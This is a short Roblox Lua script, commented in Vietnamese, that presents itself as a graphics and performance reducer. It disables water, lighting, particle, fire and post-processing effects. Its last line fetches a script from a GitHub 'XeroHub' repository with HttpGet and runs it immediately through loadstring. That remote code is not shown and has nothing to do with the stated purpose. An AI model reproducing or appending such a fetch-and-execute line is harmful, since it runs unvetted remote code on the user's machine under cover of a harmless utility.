local decalsyeeted = false
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain

-- Tắt hiệu ứng nước
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0

-- Giảm chất lượng ánh sáng
l.GlobalShadows = false
l.FogEnd = 1e9 -- Vô hiệu hóa sương mù
l.Brightness = 0

-- Giảm chất lượng đồ họa (nếu có quyền)
pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)

-- Duyệt qua tất cả đối tượng trong game
for _, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = Enum.Material.Plastic
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") then
        if decalsyeeted then
            v.Transparency = 1 -- Ẩn decal và texture
        end
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0) -- Xóa hiệu ứng hạt
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1 -- Giảm sức ảnh hưởng của vụ nổ
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false -- Tắt hiệu ứng lửa, ánh sáng, khói, lấp lánh
    elseif v:IsA("MeshPart") then
        v.Material = Enum.Material.Plastic
        v.Reflectance = 0
        v.TextureID = "" -- Xóa Texture thay vì dùng ID sai
    end
end

-- Tắt hiệu ứng hình ảnh trong Lighting
for _, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xero2409/XeroHub/refs/heads/main/main.lua"))()
